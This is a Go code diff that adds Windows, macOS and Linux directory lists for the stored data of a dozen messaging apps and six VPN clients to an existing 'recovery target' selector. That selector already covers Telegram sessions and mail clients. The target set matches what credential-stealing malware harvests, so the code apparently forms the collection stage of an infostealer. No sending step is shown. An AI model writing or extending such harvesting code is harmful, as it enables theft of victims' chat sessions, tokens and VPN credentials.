@@ -65,6 +65,40 @@ func defaultLabelFor(typ string) string {
 		return "minecraft-config"
 	case "telegram-session":
 		return "telegram-session"
+	case "pidgin-data":
+		return "pidgin-data"
+	case "psi-data":
+		return "psi-data"
+	case "discord-data":
+		return "discord-data"
+	case "slack-data":
+		return "slack-data"
+	case "element-data":
+		return "element-data"
+	case "icq-data":
+		return "icq-data"
+	case "signal-data":
+		return "signal-data"
+	case "viber-data":
+		return "viber-data"
+	case "whatsapp-data":
+		return "whatsapp-data"
+	case "skype-data":
+		return "skype-data"
+	case "tox-data":
+		return "tox-data"
+	case "nordvpn-data":
+		return "nordvpn-data"
+	case "openvpn-data":
+		return "openvpn-data"
+	case "protonvpn-data":
+		return "protonvpn-data"
+	case "surfshark-data":
+		return "surfshark-data"
+	case "expressvpn-data":
+		return "expressvpn-data"
+	case "cyberghost-data":
+		return "cyberghost-data"
 	case "foxmail-data":
 		return "foxmail-data"
 	case "mailbird-data":
@@ -107,6 +141,40 @@ func resolveSelectionPaths(selection protocol.RecoveryTargetSelection) []string 
 		return joinMinecraftPath("config")
 	case "telegram-session":
 		return telegramSessionPaths()
+	case "pidgin-data":
+		return pidginDataPaths()
+	case "psi-data":
+		return psiDataPaths()
+	case "discord-data":
+		return discordDataPaths()
+	case "slack-data":
+		return slackDataPaths()
+	case "element-data":
+		return elementDataPaths()
+	case "icq-data":
+		return icqDataPaths()
+	case "signal-data":
+		return signalDataPaths()
+	case "viber-data":
+		return viberDataPaths()
+	case "whatsapp-data":
+		return whatsappDataPaths()
+	case "skype-data":
+		return skypeDataPaths()
+	case "tox-data":
+		return toxDataPaths()
+	case "nordvpn-data":
+		return nordVPNDataPaths()
+	case "openvpn-data":
+		return openVPNDataPaths()
+	case "protonvpn-data":
+		return protonVPNDataPaths()
+	case "surfshark-data":
+		return surfsharkDataPaths()
+	case "expressvpn-data":
+		return expressVPNDataPaths()
+	case "cyberghost-data":
+		return cyberGhostDataPaths()
 	case "foxmail-data":
 		return foxmailDataPaths()
 	case "mailbird-data":
@@ -314,6 +382,784 @@ func telegramSessionPaths() []string {
 		if home != "" {
 			paths = append(paths, filepath.Join(home, ".local", "share", "TelegramDesktop", "tdata"))
 		}
+	}
+	return paths
+}
+
+func pidginDataPaths() []string {
+	home, _ := os.UserHomeDir()
+	paths := []string{}
+	switch runtime.GOOS {
+	case "windows":
+		appData := os.Getenv("APPDATA")
+		if appData == "" && home != "" {
+			appData = filepath.Join(home, "AppData", "Roaming")
+		}
+		if appData != "" {
+			paths = append(paths,
+				filepath.Join(appData, ".purple"),
+				filepath.Join(appData, "Pidgin"),
+			)
+		}
+	case "darwin":
+		if home != "" {
+			support := filepath.Join(home, "Library", "Application Support")
+			paths = append(paths,
+				filepath.Join(support, "Pidgin"),
+				filepath.Join(home, ".purple"),
+			)
+		}
+	default:
+		if home != "" {
+			paths = append(paths,
+				filepath.Join(home, ".purple"),
+				filepath.Join(home, ".config", "pidgin"),
+				filepath.Join(home, ".config", "purple"),
+			)
+		}
+		if config := os.Getenv("XDG_CONFIG_HOME"); config != "" {
+			paths = append(paths, filepath.Join(config, "pidgin"))
+		}
+	}
+	return paths
+}
+
+func psiDataPaths() []string {
+	home, _ := os.UserHomeDir()
+	paths := []string{}
+	switch runtime.GOOS {
+	case "windows":
+		appData := os.Getenv("APPDATA")
+		if appData == "" && home != "" {
+			appData = filepath.Join(home, "AppData", "Roaming")
+		}
+		if appData != "" {
+			paths = append(paths,
+				filepath.Join(appData, "Psi"),
+				filepath.Join(appData, "Psi+"),
+			)
+		}
+	case "darwin":
+		if home != "" {
+			support := filepath.Join(home, "Library", "Application Support")
+			paths = append(paths,
+				filepath.Join(support, "Psi"),
+				filepath.Join(support, "Psi+"),
+			)
+		}
+	default:
+		if home != "" {
+			paths = append(paths,
+				filepath.Join(home, ".psi"),
+				filepath.Join(home, ".psi+"),
+				filepath.Join(home, ".config", "psi"),
+				filepath.Join(home, ".config", "psi+"),
+			)
+		}
+		if config := os.Getenv("XDG_CONFIG_HOME"); config != "" {
+			paths = append(paths,
+				filepath.Join(config, "psi"),
+				filepath.Join(config, "psi+"),
+			)
+		}
+	}
+	return paths
+}
+
+func discordDataPaths() []string {
+	home, _ := os.UserHomeDir()
+	paths := []string{}
+	switch runtime.GOOS {
+	case "windows":
+		appData := os.Getenv("APPDATA")
+		if appData == "" && home != "" {
+			appData = filepath.Join(home, "AppData", "Roaming")
+		}
+		if appData != "" {
+			paths = append(paths,
+				filepath.Join(appData, "Discord"),
+				filepath.Join(appData, "discordcanary"),
+				filepath.Join(appData, "discordptb"),
+			)
+		}
+		localAppData := os.Getenv("LOCALAPPDATA")
+		if localAppData == "" && home != "" {
+			localAppData = filepath.Join(home, "AppData", "Local")
+		}
+		if localAppData != "" {
+			paths = append(paths,
+				filepath.Join(localAppData, "Discord"),
+				filepath.Join(localAppData, "discordcanary"),
+				filepath.Join(localAppData, "discordptb"),
+			)
+		}
+	case "darwin":
+		if home != "" {
+			support := filepath.Join(home, "Library", "Application Support")
+			paths = append(paths,
+				filepath.Join(support, "discord"),
+				filepath.Join(support, "discordcanary"),
+				filepath.Join(support, "discordptb"),
+			)
+		}
+	default:
+		if home != "" {
+			paths = append(paths,
+				filepath.Join(home, ".config", "discord"),
+				filepath.Join(home, ".config", "discordcanary"),
+				filepath.Join(home, ".config", "discordptb"),
+			)
+		}
+		if config := os.Getenv("XDG_CONFIG_HOME"); config != "" {
+			paths = append(paths,
+				filepath.Join(config, "discord"),
+				filepath.Join(config, "discordcanary"),
+				filepath.Join(config, "discordptb"),
+			)
+		}
+	}
+	return paths
+}
+
+func slackDataPaths() []string {
+	home, _ := os.UserHomeDir()
+	paths := []string{}
+	switch runtime.GOOS {
+	case "windows":
+		appData := os.Getenv("APPDATA")
+		if appData == "" && home != "" {
+			appData = filepath.Join(home, "AppData", "Roaming")
+		}
+		if appData != "" {
+			paths = append(paths, filepath.Join(appData, "Slack"))
+		}
+		localAppData := os.Getenv("LOCALAPPDATA")
+		if localAppData == "" && home != "" {
+			localAppData = filepath.Join(home, "AppData", "Local")
+		}
+		if localAppData != "" {
+			paths = append(paths, filepath.Join(localAppData, "slack"))
+		}
+	case "darwin":
+		if home != "" {
+			paths = append(paths, filepath.Join(home, "Library", "Application Support", "Slack"))
+		}
+	default:
+		if home != "" {
+			paths = append(paths, filepath.Join(home, ".config", "Slack"))
+		}
+		if config := os.Getenv("XDG_CONFIG_HOME"); config != "" {
+			paths = append(paths, filepath.Join(config, "Slack"))
+		}
+	}
+	return paths
+}
+
+func elementDataPaths() []string {
+	home, _ := os.UserHomeDir()
+	paths := []string{}
+	switch runtime.GOOS {
+	case "windows":
+		appData := os.Getenv("APPDATA")
+		if appData == "" && home != "" {
+			appData = filepath.Join(home, "AppData", "Roaming")
+		}
+		if appData != "" {
+			paths = append(paths,
+				filepath.Join(appData, "Element"),
+				filepath.Join(appData, "Riot"),
+			)
+		}
+	case "darwin":
+		if home != "" {
+			support := filepath.Join(home, "Library", "Application Support")
+			paths = append(paths,
+				filepath.Join(support, "Element"),
+				filepath.Join(support, "Riot"),
+			)
+		}
+	default:
+		if home != "" {
+			paths = append(paths,
+				filepath.Join(home, ".config", "Element"),
+				filepath.Join(home, ".config", "Riot"),
+			)
+		}
+		if config := os.Getenv("XDG_CONFIG_HOME"); config != "" {
+			paths = append(paths,
+				filepath.Join(config, "Element"),
+				filepath.Join(config, "Riot"),
+			)
+		}
+	}
+	return paths
+}
+
+func icqDataPaths() []string {
+	home, _ := os.UserHomeDir()
+	paths := []string{}
+	switch runtime.GOOS {
+	case "windows":
+		appData := os.Getenv("APPDATA")
+		if appData == "" && home != "" {
+			appData = filepath.Join(home, "AppData", "Roaming")
+		}
+		if appData != "" {
+			paths = append(paths, filepath.Join(appData, "ICQ"))
+		}
+		localAppData := os.Getenv("LOCALAPPDATA")
+		if localAppData == "" && home != "" {
+			localAppData = filepath.Join(home, "AppData", "Local")
+		}
+		if localAppData != "" {
+			paths = append(paths, filepath.Join(localAppData, "ICQ"))
+		}
+	case "darwin":
+		if home != "" {
+			paths = append(paths, filepath.Join(home, "Library", "Application Support", "ICQ"))
+		}
+	default:
+		if home != "" {
+			paths = append(paths,
+				filepath.Join(home, ".config", "ICQ"),
+				filepath.Join(home, ".local", "share", "ICQ"),
+			)
+		}
+		if config := os.Getenv("XDG_CONFIG_HOME"); config != "" {
+			paths = append(paths, filepath.Join(config, "ICQ"))
+		}
+	}
+	return paths
+}
+
+func signalDataPaths() []string {
+	home, _ := os.UserHomeDir()
+	paths := []string{}
+	switch runtime.GOOS {
+	case "windows":
+		appData := os.Getenv("APPDATA")
+		if appData == "" && home != "" {
+			appData = filepath.Join(home, "AppData", "Roaming")
+		}
+		if appData != "" {
+			paths = append(paths, filepath.Join(appData, "Signal"))
+		}
+	case "darwin":
+		if home != "" {
+			paths = append(paths, filepath.Join(home, "Library", "Application Support", "Signal"))
+		}
+	default:
+		if home != "" {
+			paths = append(paths, filepath.Join(home, ".config", "Signal"))
+		}
+		if config := os.Getenv("XDG_CONFIG_HOME"); config != "" {
+			paths = append(paths, filepath.Join(config, "Signal"))
+		}
+		if dataHome := os.Getenv("XDG_DATA_HOME"); dataHome != "" {
+			paths = append(paths, filepath.Join(dataHome, "Signal"))
+		}
+	}
+	return paths
+}
+
+func viberDataPaths() []string {
+	home, _ := os.UserHomeDir()
+	paths := []string{}
+	switch runtime.GOOS {
+	case "windows":
+		appData := os.Getenv("APPDATA")
+		if appData == "" && home != "" {
+			appData = filepath.Join(home, "AppData", "Roaming")
+		}
+		if appData != "" {
+			paths = append(paths, filepath.Join(appData, "ViberPC"))
+		}
+		localAppData := os.Getenv("LOCALAPPDATA")
+		if localAppData == "" && home != "" {
+			localAppData = filepath.Join(home, "AppData", "Local")
+		}
+		if localAppData != "" {
+			paths = append(paths,
+				filepath.Join(localAppData, "Viber"),
+				filepath.Join(localAppData, "ViberPC"),
+			)
+		}
+	case "darwin":
+		if home != "" {
+			support := filepath.Join(home, "Library", "Application Support")
+			paths = append(paths,
+				filepath.Join(support, "Viber"),
+				filepath.Join(support, "ViberPC"),
+			)
+		}
+	default:
+		if home != "" {
+			paths = append(paths,
+				filepath.Join(home, ".ViberPC"),
+				filepath.Join(home, ".config", "Viber"),
+				filepath.Join(home, ".config", "ViberPC"),
+			)
+		}
+		if config := os.Getenv("XDG_CONFIG_HOME"); config != "" {
+			paths = append(paths,
+				filepath.Join(config, "Viber"),
+				filepath.Join(config, "ViberPC"),
+			)
+		}
+	}
+	return paths
+}
+
+func whatsappDataPaths() []string {
+	home, _ := os.UserHomeDir()
+	paths := []string{}
+	switch runtime.GOOS {
+	case "windows":
+		appData := os.Getenv("APPDATA")
+		if appData == "" && home != "" {
+			appData = filepath.Join(home, "AppData", "Roaming")
+		}
+		if appData != "" {
+			paths = append(paths, filepath.Join(appData, "WhatsApp"))
+		}
+		localAppData := os.Getenv("LOCALAPPDATA")
+		if localAppData == "" && home != "" {
+			localAppData = filepath.Join(home, "AppData", "Local")
+		}
+		if localAppData != "" {
+			paths = append(paths, filepath.Join(localAppData, "WhatsApp"))
+		}
+	case "darwin":
+		if home != "" {
+			paths = append(paths, filepath.Join(home, "Library", "Application Support", "WhatsApp"))
+		}
+	default:
+		if home != "" {
+			paths = append(paths, filepath.Join(home, ".config", "WhatsApp"))
+		}
+		if config := os.Getenv("XDG_CONFIG_HOME"); config != "" {
+			paths = append(paths, filepath.Join(config, "WhatsApp"))
+		}
+		if dataHome := os.Getenv("XDG_DATA_HOME"); dataHome != "" {
+			paths = append(paths, filepath.Join(dataHome, "WhatsApp"))
+		}
+	}
+	return paths
+}
+
+func skypeDataPaths() []string {
+	home, _ := os.UserHomeDir()
+	paths := []string{}
+	switch runtime.GOOS {
+	case "windows":
+		appData := os.Getenv("APPDATA")
+		if appData == "" && home != "" {
+			appData = filepath.Join(home, "AppData", "Roaming")
+		}
+		if appData != "" {
+			paths = append(paths,
+				filepath.Join(appData, "Skype"),
+				filepath.Join(appData, "Microsoft", "Skype for Desktop"),
+			)
+		}
+		localAppData := os.Getenv("LOCALAPPDATA")
+		if localAppData == "" && home != "" {
+			localAppData = filepath.Join(home, "AppData", "Local")
+		}
+		if localAppData != "" {
+			paths = append(paths, filepath.Join(localAppData, "Packages", "Microsoft.SkypeApp_kzf8qxf38zg5c"))
+		}
+	case "darwin":
+		if home != "" {
+			support := filepath.Join(home, "Library", "Application Support")
+			paths = append(paths,
+				filepath.Join(support, "Skype"),
+				filepath.Join(support, "Microsoft", "Skype for Desktop"),
+			)
+		}
+	default:
+		if home != "" {
+			paths = append(paths,
+				filepath.Join(home, ".Skype"),
+				filepath.Join(home, ".config", "skypeforlinux"),
+			)
+		}
+		if config := os.Getenv("XDG_CONFIG_HOME"); config != "" {
+			paths = append(paths, filepath.Join(config, "skypeforlinux"))
+		}
+	}
+	return paths
+}
+
+func toxDataPaths() []string {
+	home, _ := os.UserHomeDir()
+	paths := []string{}
+	switch runtime.GOOS {
+	case "windows":
+		appData := os.Getenv("APPDATA")
+		if appData == "" && home != "" {
+			appData = filepath.Join(home, "AppData", "Roaming")
+		}
+		if appData != "" {
+			paths = append(paths, filepath.Join(appData, "Tox"))
+		}
+	case "darwin":
+		if home != "" {
+			paths = append(paths, filepath.Join(home, "Library", "Application Support", "Tox"))
+		}
+	default:
+		if home != "" {
+			paths = append(paths,
+				filepath.Join(home, ".config", "tox"),
+				filepath.Join(home, ".local", "share", "tox"),
+			)
+		}
+		if config := os.Getenv("XDG_CONFIG_HOME"); config != "" {
+			paths = append(paths, filepath.Join(config, "tox"))
+		}
+		if dataHome := os.Getenv("XDG_DATA_HOME"); dataHome != "" {
+			paths = append(paths, filepath.Join(dataHome, "tox"))
+		}
+	}
+	return paths
+}
+
+func nordVPNDataPaths() []string {
+	home, _ := os.UserHomeDir()
+	paths := []string{}
+	switch runtime.GOOS {
+	case "windows":
+		localAppData := os.Getenv("LOCALAPPDATA")
+		if localAppData == "" && home != "" {
+			localAppData = filepath.Join(home, "AppData", "Local")
+		}
+		if localAppData != "" {
+			paths = append(paths,
+				filepath.Join(localAppData, "NordVPN"),
+				filepath.Join(localAppData, "NordVPN", "NordVPN"),
+			)
+		}
+		appData := os.Getenv("APPDATA")
+		if appData == "" && home != "" {
+			appData = filepath.Join(home, "AppData", "Roaming")
+		}
+		if appData != "" {
+			paths = append(paths, filepath.Join(appData, "NordVPN"))
+		}
+		programData := os.Getenv("PROGRAMDATA")
+		if programData != "" {
+			paths = append(paths, filepath.Join(programData, "NordVPN"))
+		}
+	case "darwin":
+		if home != "" {
+			support := filepath.Join(home, "Library", "Application Support")
+			paths = append(paths,
+				filepath.Join(support, "NordVPN"),
+				filepath.Join(home, "Library", "Group Containers", "group.com.nordvpn.osx"),
+			)
+		}
+		paths = append(paths, "/Library/Application Support/NordVPN")
+	default:
+		if home != "" {
+			paths = append(paths,
+				filepath.Join(home, ".config", "NordVPN"),
+				filepath.Join(home, ".config", "nordvpn"),
+				filepath.Join(home, ".local", "share", "NordVPN"),
+			)
+		}
+		if config := os.Getenv("XDG_CONFIG_HOME"); config != "" {
+			paths = append(paths, filepath.Join(config, "nordvpn"))
+		}
+		if dataHome := os.Getenv("XDG_DATA_HOME"); dataHome != "" {
+			paths = append(paths, filepath.Join(dataHome, "nordvpn"))
+		}
+		paths = append(paths,
+			"/etc/nordvpn",
+			"/var/lib/nordvpn",
+		)
+	}
+	return paths
+}
+
+func openVPNDataPaths() []string {
+	home, _ := os.UserHomeDir()
+	paths := []string{}
+	switch runtime.GOOS {
+	case "windows":
+		programFiles := os.Getenv("ProgramFiles")
+		if programFiles != "" {
+			paths = append(paths,
+				filepath.Join(programFiles, "OpenVPN"),
+				filepath.Join(programFiles, "OpenVPN", "config"),
+				filepath.Join(programFiles, "OpenVPN Connect"),
+			)
+		}
+		programFilesX86 := os.Getenv("ProgramFiles(x86)")
+		if programFilesX86 != "" {
+			paths = append(paths,
+				filepath.Join(programFilesX86, "OpenVPN"),
+				filepath.Join(programFilesX86, "OpenVPN Connect"),
+			)
+		}
+		programData := os.Getenv("PROGRAMDATA")
+		if programData != "" {
+			paths = append(paths,
+				filepath.Join(programData, "OpenVPN"),
+				filepath.Join(programData, "OpenVPN Connect"),
+			)
+		}
+		appData := os.Getenv("APPDATA")
+		if appData == "" && home != "" {
+			appData = filepath.Join(home, "AppData", "Roaming")
+		}
+		if appData != "" {
+			paths = append(paths,
+				filepath.Join(appData, "OpenVPN"),
+				filepath.Join(appData, "OpenVPN Connect"),
+			)
+		}
+	case "darwin":
+		if home != "" {
+			support := filepath.Join(home, "Library", "Application Support")
+			paths = append(paths,
+				filepath.Join(support, "OpenVPN"),
+				filepath.Join(support, "OpenVPN Connect"),
+			)
+		}
+		paths = append(paths,
+			"/Library/Application Support/OpenVPN",
+			"/Library/Application Support/OpenVPN Connect",
+		)
+	default:
+		if home != "" {
+			paths = append(paths,
+				filepath.Join(home, ".config", "OpenVPN"),
+				filepath.Join(home, ".config", "openvpn"),
+				filepath.Join(home, ".local", "share", "OpenVPN"),
+				filepath.Join(home, "OpenVPN"),
+			)
+		}
+		if config := os.Getenv("XDG_CONFIG_HOME"); config != "" {
+			paths = append(paths, filepath.Join(config, "openvpn"))
+		}
+		if dataHome := os.Getenv("XDG_DATA_HOME"); dataHome != "" {
+			paths = append(paths, filepath.Join(dataHome, "openvpn"))
+		}
+		paths = append(paths,
+			"/etc/openvpn",
+			"/etc/openvpn3",
+		)
+	}
+	return paths
+}
+
+func protonVPNDataPaths() []string {
+	home, _ := os.UserHomeDir()
+	paths := []string{}
+	switch runtime.GOOS {
+	case "windows":
+		localAppData := os.Getenv("LOCALAPPDATA")
+		if localAppData == "" && home != "" {
+			localAppData = filepath.Join(home, "AppData", "Local")
+		}
+		if localAppData != "" {
+			paths = append(paths, filepath.Join(localAppData, "ProtonVPN"))
+		}
+		appData := os.Getenv("APPDATA")
+		if appData == "" && home != "" {
+			appData = filepath.Join(home, "AppData", "Roaming")
+		}
+		if appData != "" {
+			paths = append(paths, filepath.Join(appData, "ProtonVPN"))
+		}
+		programData := os.Getenv("PROGRAMDATA")
+		if programData != "" {
+			paths = append(paths, filepath.Join(programData, "ProtonVPN"))
+		}
+	case "darwin":
+		if home != "" {
+			support := filepath.Join(home, "Library", "Application Support")
+			paths = append(paths,
+				filepath.Join(support, "ProtonVPN"),
+				filepath.Join(support, "Proton Technologies AG", "ProtonVPN"),
+			)
+		}
+	default:
+		if home != "" {
+			paths = append(paths,
+				filepath.Join(home, ".config", "protonvpn"),
+				filepath.Join(home, ".cache", "protonvpn"),
+				filepath.Join(home, ".local", "share", "protonvpn"),
+			)
+		}
+		if config := os.Getenv("XDG_CONFIG_HOME"); config != "" {
+			paths = append(paths, filepath.Join(config, "protonvpn"))
+		}
+		if dataHome := os.Getenv("XDG_DATA_HOME"); dataHome != "" {
+			paths = append(paths, filepath.Join(dataHome, "protonvpn"))
+		}
+		paths = append(paths,
+			"/etc/protonvpn",
+			"/var/lib/protonvpn",
+		)
+	}
+	return paths
+}
+
+func surfsharkDataPaths() []string {
+	home, _ := os.UserHomeDir()
+	paths := []string{}
+	switch runtime.GOOS {
+	case "windows":
+		localAppData := os.Getenv("LOCALAPPDATA")
+		if localAppData == "" && home != "" {
+			localAppData = filepath.Join(home, "AppData", "Local")
+		}
+		if localAppData != "" {
+			paths = append(paths, filepath.Join(localAppData, "Surfshark"))
+		}
+		appData := os.Getenv("APPDATA")
+		if appData == "" && home != "" {
+			appData = filepath.Join(home, "AppData", "Roaming")
+		}
+		if appData != "" {
+			paths = append(paths, filepath.Join(appData, "Surfshark"))
+		}
+		programData := os.Getenv("PROGRAMDATA")
+		if programData != "" {
+			paths = append(paths, filepath.Join(programData, "Surfshark"))
+		}
+	case "darwin":
+		if home != "" {
+			paths = append(paths, filepath.Join(home, "Library", "Application Support", "Surfshark"))
+		}
+	default:
+		if home != "" {
+			paths = append(paths,
+				filepath.Join(home, ".config", "surfshark"),
+				filepath.Join(home, ".local", "share", "surfshark"),
+			)
+		}
+		if config := os.Getenv("XDG_CONFIG_HOME"); config != "" {
+			paths = append(paths, filepath.Join(config, "surfshark"))
+		}
+		if dataHome := os.Getenv("XDG_DATA_HOME"); dataHome != "" {
+			paths = append(paths, filepath.Join(dataHome, "surfshark"))
+		}
+		paths = append(paths, "/etc/surfshark")
+	}
+	return paths
+}
+
+func expressVPNDataPaths() []string {
+	home, _ := os.UserHomeDir()
+	paths := []string{}
+	switch runtime.GOOS {
+	case "windows":
+		localAppData := os.Getenv("LOCALAPPDATA")
+		if localAppData == "" && home != "" {
+			localAppData = filepath.Join(home, "AppData", "Local")
+		}
+		if localAppData != "" {
+			paths = append(paths, filepath.Join(localAppData, "ExpressVPN"))
+		}
+		appData := os.Getenv("APPDATA")
+		if appData == "" && home != "" {
+			appData = filepath.Join(home, "AppData", "Roaming")
+		}
+		if appData != "" {
+			paths = append(paths, filepath.Join(appData, "ExpressVPN"))
+		}
+		programData := os.Getenv("PROGRAMDATA")
+		if programData != "" {
+			paths = append(paths, filepath.Join(programData, "ExpressVPN"))
+		}
+	case "darwin":
+		if home != "" {
+			support := filepath.Join(home, "Library", "Application Support")
+			paths = append(paths,
+				filepath.Join(support, "ExpressVPN"),
+				filepath.Join(home, "Library", "Preferences", "com.expressvpn.ExpressVPN.plist"),
+			)
+		}
+		paths = append(paths, "/Library/Application Support/ExpressVPN")
+	default:
+		if home != "" {
+			paths = append(paths,
+				filepath.Join(home, ".config", "expressvpn"),
+				filepath.Join(home, ".local", "share", "expressvpn"),
+			)
+		}
+		if config := os.Getenv("XDG_CONFIG_HOME"); config != "" {
+			paths = append(paths, filepath.Join(config, "expressvpn"))
+		}
+		if dataHome := os.Getenv("XDG_DATA_HOME"); dataHome != "" {
+			paths = append(paths, filepath.Join(dataHome, "expressvpn"))
+		}
+		paths = append(paths, "/etc/expressvpn")
+	}
+	return paths
+}
+
+func cyberGhostDataPaths() []string {
+	home, _ := os.UserHomeDir()
+	paths := []string{}
+	switch runtime.GOOS {
+	case "windows":
+		localAppData := os.Getenv("LOCALAPPDATA")
+		if localAppData == "" && home != "" {
+			localAppData = filepath.Join(home, "AppData", "Local")
+		}
+		if localAppData != "" {
+			paths = append(paths,
+				filepath.Join(localAppData, "CyberGhost"),
+				filepath.Join(localAppData, "CyberGhostVPN"),
+			)
+		}
+		appData := os.Getenv("APPDATA")
+		if appData == "" && home != "" {
+			appData = filepath.Join(home, "AppData", "Roaming")
+		}
+		if appData != "" {
+			paths = append(paths,
+				filepath.Join(appData, "CyberGhost"),
+				filepath.Join(appData, "CyberGhostVPN"),
+			)
+		}
+		programData := os.Getenv("PROGRAMDATA")
+		if programData != "" {
+			paths = append(paths,
+				filepath.Join(programData, "CyberGhost"),
+				filepath.Join(programData, "CyberGhost 8"),
+				filepath.Join(programData, "CyberGhostVPN"),
+			)
+		}
+	case "darwin":
+		if home != "" {
+			support := filepath.Join(home, "Library", "Application Support")
+			paths = append(paths,
+				filepath.Join(support, "CyberGhost"),
+				filepath.Join(support, "CyberGhostVPN"),
+			)
+		}
+	default:
+		if home != "" {
+			paths = append(paths,
+				filepath.Join(home, ".config", "cyberghost"),
+				filepath.Join(home, ".config", "cyberghostvpn"),
+				filepath.Join(home, ".local", "share", "cyberghostvpn"),
+			)
+		}
+		if config := os.Getenv("XDG_CONFIG_HOME"); config != "" {
+			paths = append(paths,
+				filepath.Join(config, "cyberghost"),
+				filepath.Join(config, "cyberghostvpn"),
+			)
+		}
+		if dataHome := os.Getenv("XDG_DATA_HOME"); dataHome != "" {
+			paths = append(paths, filepath.Join(dataHome, "cyberghostvpn"))
+		}
+		paths = append(paths, "/etc/cyberghost")
 	}
 	return paths
 }
